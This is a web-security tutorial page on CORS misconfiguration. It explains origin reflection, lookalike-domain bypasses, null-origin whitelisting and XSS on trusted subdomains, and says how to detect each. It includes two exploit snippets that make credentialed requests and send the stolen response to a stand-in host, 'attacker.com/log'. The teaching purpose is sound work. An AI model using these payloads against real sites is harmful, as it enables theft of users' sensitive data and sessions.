---
title: "CORS misconfiguration"
weight: 7
description: "Learn how misconfigured CORS policies can expose sensitive data through origin reflection, null origin whitelisting, and XSS on trusted subdomains."
---

**Impact**: If a web response includes sensitive data (like an API key or CSRF token), and CORS is misconfigured, an attacker could steal that data using a malicious website.

---

## What is CORS?

CORS (Cross-Origin Resource Sharing) is a browser security feature that controls how web applications interact with resources hosted on different origins. It's designed to prevent malicious websites from making unauthorized requests to other sites on behalf of the user.

> **Note**: An "origin" in CORS includes the protocol, domain, and port. So `https://example.com` and `http://example.com` are considered different origins
\[[↗](https://developer.mozilla.org/en-US/docs/Glossary/Origin)].

---

## Origin Reflection in ACAO Header

Some vulnerable servers reflect the `Origin` header in the `Access-Control-Allow-Origin` response without validating it.

**How to Detect**

Send a request with a custom `Origin` header (e.g., `Origin: https://evil.com`) and check if the same origin is reflected back.

```http
Access-Control-Allow-Origin: https://evil.com
```

> **Warning**: If `Access-Control-Allow-Credentials: true` is also present, an attacker can send authenticated requests from a malicious origin.


**Exploitation Example**

```html
<script>
  var req = new XMLHttpRequest();
  req.onload = function () {
    location = 'https://attacker.com/log?data=' + this.responseText;
  };
  req.open('GET', 'https://vulnerable-website.com/secret-data', true);
  req.withCredentials = true;
  req.send();
</script>
```

---

## Bypassing Origin Checks with Similar Domains

Some applications whitelist trusted origins without strict validation, making it possible to bypass checks using similar-looking domains.

**Examples**:

- `hackersnormal-website.com`
- `normal-website.com.attacker.com`

> **Note**: You need to know or guess the whitelisted origins to attempt this.

---

## Whitelisted `null` Origin

If the server allows `null` as an origin, it may be vulnerable to data theft through sandboxed iframes.

**How to Detect**

Send a request with:

```http
Origin: null
```

and check for:

```http
Access-Control-Allow-Origin: null
```

**Exploitation Example**

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,
<script>
  var req = new XMLHttpRequest();
  req.onload = function () {
    location = 'https://attacker.com/log?data=' + this.responseText;
  };
  req.open('GET', 'https://vulnerable-website.com/secret-data', true);
  req.withCredentials = true;
  req.send();
</script>"></iframe>
```

---

## Using XSS on a Trusted Subdomain to Exploit CORS

If a site allows CORS requests only from a trusted subdomain and you find an XSS vulnerability on that subdomain, you can use the XSS to steal data via CORS.

**Example Response:**

```http
Access-Control-Allow-Origin: https://sub.vulnerable.com
Access-Control-Allow-Credentials: true
```

**Exploitation Flow:**

1. Find XSS on `https://sub.vulnerable.com`.
2. Inject malicious script that performs a CORS request to the main domain.
3. Steal the sensitive response.

URL:
```md
https://sub.vulnerable.com/?xss=<script>...your-code...</script>
```


---

## The Role of SameSite Cookies

CORS exploits often rely on the browser sending cookies along with cross-origin requests. This depends on the `SameSite` attribute of the cookie.
To exploit CORS with `withCredentials=true`, the session cookie must be accessible (i.e., not blocked by `SameSite=Strict`).